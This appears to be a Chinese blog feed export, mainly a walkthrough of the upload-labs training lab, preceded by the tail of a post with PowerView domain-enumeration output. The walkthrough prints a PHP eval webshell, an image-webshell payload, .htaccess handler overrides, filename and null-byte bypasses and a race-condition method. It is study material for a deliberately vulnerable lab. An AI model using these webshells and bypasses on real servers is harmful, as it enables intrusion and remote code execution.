&#123;TERMSRV/WIN7, TERMSRV/win7.MCITP.COM, Restrict                                edKrbHost/WIN7, HOST/WIN7...&#125;cn                            : WIN7operatingsystem               : Windows <span class="hljs-number">7</span> 专业版operatingsystemservicepack    : Service Pack <span class="hljs-number">1</span>msds<span class="hljs-literal">-supportedencryptiontypes</span> : <span class="hljs-number">28</span>operatingsystemversion        : <span class="hljs-number">6.1</span> (<span class="hljs-number">7601</span>)dnshostname                   : WIN7.MCITP.COMaccountexpires                : NEVERinstancetype               : <span class="hljs-number">4</span>usnchanged                 : <span class="hljs-number">32906</span>badpasswordtime            : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>codepage                   : <span class="hljs-number">0</span>countrycode                : <span class="hljs-number">0</span>objectguid                 : <span class="hljs-number">975</span>e7e9d<span class="hljs-literal">-b6a2</span><span class="hljs-literal">-4f2c</span><span class="hljs-literal">-aaf4</span><span class="hljs-literal">-1925d20a567a</span>samaccountname             : WIN2003<span class="hljs-variable">$</span>usncreated                 : <span class="hljs-number">32899</span>iscriticalsystemobject     : Falsedisplayname                : WIN2003<span class="hljs-variable">$</span>dscorepropagationdata      : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>pwdlastset                 : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span>objectclass                : &#123;top, person, organizationalPerson, user...&#125;useraccountcontrol         : WORKSTATION_TRUST_ACCOUNTlogoncount                 : <span class="hljs-number">6</span>lastlogon                  : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>whenchanged                : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">7</span>:<span class="hljs-number">11</span>:<span class="hljs-number">16</span>lastlogontimestamp         : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">15</span>:<span class="hljs-number">11</span>:<span class="hljs-number">16</span>name                       : WIN2003localpolicyflags           : <span class="hljs-number">0</span>lastlogoff                 : <span class="hljs-number">1601</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">8</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>whencreated                : <span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">15</span> <span class="hljs-number">7</span>:<span class="hljs-number">11</span>:<span class="hljs-number">13</span>samaccounttype             : MACHINE_ACCOUNTdistinguishedname          : CN=WIN2003,CN=Computers,DC=MCITP,DC=COMobjectsid                  : S<span class="hljs-literal">-1</span><span class="hljs-literal">-5</span><span class="hljs-literal">-21</span><span class="hljs-literal">-1452006093</span><span class="hljs-literal">-426277424</span><span class="hljs-literal">-3932888995</span><span class="hljs-literal">-1105</span>primarygroupid             : <span class="hljs-number">515</span>badpwdcount                : <span class="hljs-number">0</span>objectcategory             : CN=Computer,CN=Schema,CN=Configuration,DC=MCITP,DC                             =COMserviceprincipalname       : &#123;HOST/WIN2003, HOST/win2003.MCITP.COM&#125;cn                         : WIN2003operatingsystem            : Windows Server <span class="hljs-number">2003</span>operatingsystemservicepack : Service Pack <span class="hljs-number">2</span>operatingsystemversion     : <span class="hljs-number">5.2</span> (<span class="hljs-number">3790</span>)dnshostname                : win2003.MCITP.COMaccountexpires             : NEVER<span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</code></pre><p>​                    powerview手册：<a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows域</tag>
      
      <tag>用户/系统/域内命令</tag>
      
      <tag>windows开启/关闭3389</tag>
      
      <tag>windows UAC</tag>
      
      <tag>windows ASR</tag>
      
      <tag>windows applocker</tag>
      
      <tag>windows access token</tag>
      
      <tag>windows 认证及密码</tag>
      
      <tag>windows poweshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs通关记录</title>
    <link href="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>本文是upload-labs通关记录。</p><a id="more"></a><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>制作一个一句话木马：<code>&lt;?php @eval($_POST[1]);?&gt;</code></p><p>制作一个图片马：<code>copy 1.jpg/b +ma.php/a ma.jpg</code></p><p>图片马内容：<code>&lt;?php  fputs(fopen(&#39;xx.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;); ?&gt;</code></p><h3 id="Pass-01：前端js验证"><a href="#Pass-01：前端js验证" class="headerlink" title="Pass-01：前端js验证"></a>Pass-01：前端js验证</h3><p>随意选个马子传一下，结果秒显不允许</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215110356885.png" alt="image-20210215110356885"></p><p>猜测前端js检查了，验证前端代码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215110544819.png" alt="image-20210215110544819"></p><p><strong>绕过</strong></p><p>关了浏览器的前端js验证。</p><p>当然你要是嫌关js麻烦，你传个图片马就o了</p><p>上传图片马，然后文件包含</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215154901813.png" alt="image-20210215154901813"></p><p>菜刀连接</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215154959908.png" alt="image-20210215154959908"></p><h3 id="Pass-02：MIME"><a href="#Pass-02：MIME" class="headerlink" title="Pass-02：MIME"></a>Pass-02：MIME</h3><p>老规矩，搞个马子传一下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215122215429.png" alt="image-20210215122215429"></p><p>看一下后台源代码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215122237531.png" alt="image-20210215122237531"></p><p><strong>绕过</strong>验证MIME类型的，抓包改一下MIME为image/jpeg就o了</p><p>嫌抓包麻烦，直接传个图片马也可以。</p><h3 id="Pass-03：宽松的黑名单"><a href="#Pass-03：宽松的黑名单" class="headerlink" title="Pass-03：宽松的黑名单"></a>Pass-03：宽松的黑名单</h3><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215124206217.png" alt="image-20210215124206217"></p><p>一看黑名单验证，查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215124326909.png" alt="image-20210215124326909"></p><p>果然。</p><p><strong>绕过</strong></p><p>这个黑名单限制不是很全，找一个没有在限制里面的后缀就可以绕过，比如php3，但是当上传的这些文件要被当作php来执行，需要有以下条件：即Apache的httpd.conf有如下配置代码</p><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span> <span class="hljs-string">.ph3</span><span class="hljs-comment">#配置里面有你所上传的后缀</span></code></pre><p>此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。</p><p>或者传个图片马</p><h3 id="Pass-04-htaccsess"><a href="#Pass-04-htaccsess" class="headerlink" title="Pass-04:.htaccsess"></a>Pass-04:.htaccsess</h3><p>找个马子试一下</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215125826838.png" alt="image-20210215125826838"></p><p>看了下后台，比较长，不好列举，就以提示给的tips列举</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215125736761.png" alt="image-20210215125736761"></p><p><strong>绕过</strong></p><p>可以看到没有限制.htaccsess文件，故可以上传.htaccsess文件绕过。内容如下</p><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php</code></pre><p>这样所有文件都会解析为php，然后再上传图片马，就可以解析为php</p><h3 id="Pass-05：后缀大小写"><a href="#Pass-05：后缀大小写" class="headerlink" title="Pass-05：后缀大小写"></a>Pass-05：后缀大小写</h3><p>查看后台，这回完犊子了，加了.htaccess</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215133655371.png" alt="image-20210215133655371"></p><p>仔细看后台源代码，并没有转换大小写</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215134635811.png" alt="image-20210215134635811"></p><p><strong>绕过</strong></p><p>更改马子的后缀大小写，例如：<code>ma.Php</code></p><h3 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06:空格绕过"></a>Pass-06:空格绕过</h3><p>仔细看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215135013175.png" alt="image-20210215135013175"></p><p>相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个空格</p><h3 id="Pass-07：点绕过"><a href="#Pass-07：点绕过" class="headerlink" title="Pass-07：点绕过"></a>Pass-07：点绕过</h3><p>仔细看后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140041505.png" alt="image-20210215140041505"></p><p>可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p><p><strong>绕过</strong></p><p>抓包在filename后面加个“.”</p><h3 id="Pass-08-：-DATE"><a href="#Pass-08-：-DATE" class="headerlink" title="Pass-08 ：::$DATE"></a>Pass-08 ：::$DATE</h3><p>后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140137448.png" alt="image-20210215140137448"></p><p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p><blockquote><p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p></blockquote><p>简单讲就是在php+windows的情况下：如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名.且保持<code>&quot;::$DATA&quot;</code>之前的文件名。</p><p><em>注:仅windows适用</em></p><p><strong>绕过</strong></p><p>用burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可</p><h3 id="Pass-09：点空格点"><a href="#Pass-09：点空格点" class="headerlink" title="Pass-09：点空格点"></a>Pass-09：点空格点</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215140532614.png" alt="image-20210215140532614"></p><p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。</p><p><strong>绕过</strong></p><p>抓包构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code></p><h3 id="Pass-10：双写绕过"><a href="#Pass-10：双写绕过" class="headerlink" title="Pass-10：双写绕过"></a>Pass-10：双写绕过</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215141032311.png" alt="image-20210215141032311"></p><p>分析注意：<strong>str_ireplace</strong>函数<strong>不区分大小写</strong>的替换字符串中的一些字符，此次源码将黑名单里的文件后缀名替换成空字符。</p><p><strong>绕过</strong></p><p>用burp修改后缀名为 <code>.pphphp</code></p><h3 id="Pass-11：00截断"><a href="#Pass-11：00截断" class="headerlink" title="Pass-11：00截断"></a>Pass-11：00截断</h3><p>查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215141813823.png" alt="image-20210215141813823"></p><p>这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用<code>GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。</p><p><strong>绕过</strong></p><p>00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p><blockquote><p>截断条件：<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p></blockquote><p>抓包进行修改</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215142538909.png" alt="image-20210215142538909"></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215142754495.png" alt="image-20210215142754495"></p><h3 id="Pass-12：-00"><a href="#Pass-12：-00" class="headerlink" title="Pass-12：%00"></a>Pass-12：%00</h3><p>后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215143512734.png" alt="image-20210215143512734"></p><p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</p><p><strong>绕过</strong></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215145042313.png" alt="image-20210215145042313"></p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215145151607.png" alt="image-20210215145151607"></p><h3 id="Pass-13：文件头检测"><a href="#Pass-13：文件头检测" class="headerlink" title="Pass-13：文件头检测"></a>Pass-13：文件头检测</h3><p>这一关开始上传图片马，后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215161722242.png" alt="image-20210215161722242"></p><p>使用了 getReailFileType函数</p><p><strong>绕过</strong></p><p>burp抓包添加一个图片文件的文件幻数</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215161612151.png" alt="image-20210215161612151"></p><p>或者直接上传一张图片马即可。</p><h3 id="Pass-14：getimagesize"><a href="#Pass-14：getimagesize" class="headerlink" title="Pass-14：getimagesize"></a>Pass-14：getimagesize</h3><p>查看后台源码</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215151630875.png" alt="image-20210215151630875"></p><p>使用了getimagesize函数来验证，加对应图片的文件头就o了</p><p>比如：gif-GIF89a</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215153117383.png" alt="image-20210215153117383"></p><p>或者传一个图片马子</p><h3 id="Pass-15：exif-imagetype"><a href="#Pass-15：exif-imagetype" class="headerlink" title="Pass-15：exif_imagetype()"></a>Pass-15：exif_imagetype()</h3><p>后台</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215153456115.png" alt="image-20210215153456115"></p><p><strong>绕过</strong></p><p>同13、14一样</p><h3 id="Pass-16：二次渲染"><a href="#Pass-16：二次渲染" class="headerlink" title="Pass-16：二次渲染"></a>Pass-16：二次渲染</h3><p>后台</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    $filename = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    $filetype = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];    $tmpname = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    $target_path=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.basename($filename);    <span class="hljs-comment">// 获得上传文件的扩展名</span>    $fileext= substr(strrchr($filename,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefromjpeg($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.jpg&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefrompng($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                 <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.png&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;                           &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(($fileext == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;            <span class="hljs-comment">//使用上传的图片生成新的图片</span>            $im = imagecreatefromgif($target_path);            <span class="hljs-keyword">if</span>($im == <span class="hljs-literal">false</span>)&#123;                $msg = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;                @unlink($target_path);            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//给新图片指定文件名</span>                srand(time());                $newfilename = strval(rand()).<span class="hljs-string">&quot;.gif&quot;</span>;                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = <span class="hljs-literal">true</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&quot;上传出错！&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;    &#125;&#125;</code></pre><p>可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。</p><p>这里就不再对比上传图片马前后的区别，直接结论：图片马的恶意内容被磨除了。</p><p><strong>绕过</strong></p><p>如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考我的上一篇文章中有总结：“文件上传”</p><h3 id="Pass-17：条件竞争时间差"><a href="#Pass-17：条件竞争时间差" class="headerlink" title="Pass-17：条件竞争时间差"></a>Pass-17：条件竞争时间差</h3><p>后台</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];    $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];    $file_ext = substr($file_name,strrpos($file_name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    $upload_file = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $file_name;    <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;        <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;             rename($upload_file, $img_path);             $is_upload = <span class="hljs-literal">true</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;            unlink($upload_file);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;    &#125;&#125;</code></pre><p>不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p><strong>绕过</strong></p><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215163251176.png" alt="image-20210215163251176"></p><p>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215164100568.png" alt="image-20210215164100568"></p><p>3、接下来设置访问请求<br>1、浏览器构造请求url：<code>http://127.0.0.1/upload-labs/upload/ma.Php</code>,进行访问，然后用burp抓包<br>2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</p><p>3、设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p><p>注意：条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p><p>另外一种方法，在上一篇文章中也讲过</p><p>也可以上传图片马</p><h3 id="Pass-18：突破上传重命名"><a href="#Pass-18：突破上传重命名" class="headerlink" title="Pass-18：突破上传重命名"></a>Pass-18：突破上传重命名</h3><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。</p><h3 id="Pass-19：-绕过"><a href="#Pass-19：-绕过" class="headerlink" title="Pass-19：./绕过"></a>Pass-19：./绕过</h3><p>后台</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);        $file_name = $_POST[<span class="hljs-string">&#x27;save_name&#x27;</span>];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        <span class="hljs-keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .$file_name;            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = <span class="hljs-literal">true</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            $msg = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre><p>可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name=ma.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的/.所以可以构造save_path=ma.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php</p><p><strong>绕过</strong></p><p>burp抓包末尾添加：<code>save_name=ma.php/.</code>，注意马的名字与filename一致</p><p><img src="/2020/06/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210215173229186.png" alt="image-20210215173229186"></p><p>当然也可以传个图片马子</p><p>也可以直接在上传处保存文件名哪里后面加<code>/</code>或者<code>.</code>都可</p><h3 id="Pass-20：数组-绕过"><a href="#Pass-20：数组-绕过" class="headerlink" title="Pass-20：数组/.绕过"></a>Pass-20：数组/.绕过</h3><p>后台代码</p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;    <span class="hljs-comment">//检查MIME</span>    $allow_type = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);    <span class="hljs-keyword">if</span>(!in_array($_FILES[<span 